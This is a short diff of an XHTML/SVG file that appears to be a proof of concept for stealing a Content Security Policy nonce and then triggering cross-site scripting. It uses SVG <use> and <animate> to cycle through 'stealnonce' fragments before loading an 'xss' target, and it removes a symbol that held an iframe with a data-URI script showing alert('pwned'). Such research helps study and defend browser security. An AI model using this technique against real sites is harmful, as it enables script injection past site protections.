@@ -20,21 +20,11 @@
            </body>
          </foreignObject>
       </symbol>
-      <!-- This will include the document itself 3 times. -->
+      <!-- This will include the document itself 9 times,and then the XSS once the token is "bruteforced". -->
       <use>
          <animate attributeName="xlink:href" dur="10s"
-                  values="?nocache1#stealnonce;?nocache2#stealnonce;?nocache3#stealnonce;?nocache4#stealnonce;?nocache5#stealnonce;?nocache6#stealnonce;?nocache7#stealnonce;?nocache8#stealnonce;?nocache9#xss"/>
+                  values="?nocache1#stealnonce;?nocache2#stealnonce;?nocache3#stealnonce;?nocache4#stealnonce;?nocache5#stealnonce;?nocache6#stealnonce;?nocache7#stealnonce;?nocache8#stealnonce;nine_taketwo.xhtml?nocache9#xss"/>
       </use>
-    </svg>
-    <!-- lets imagine this second payload is added later on, once the token is stolen -->
-    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200" style="display:none;">
-      <symbol id="xss">
-         <foreignObject width="100" height="50">
-           <body xmlns="http://www.w3.org/1999/xhtml">
-             <iframe src="data:text/html,%3Cscript nonce=random%3Ealert(%27pwned%27)%3C/script%3E"></iframe>
-           </body>
-         </foreignObject>
-      </symbol>
     </svg>
   </body>
 </html>
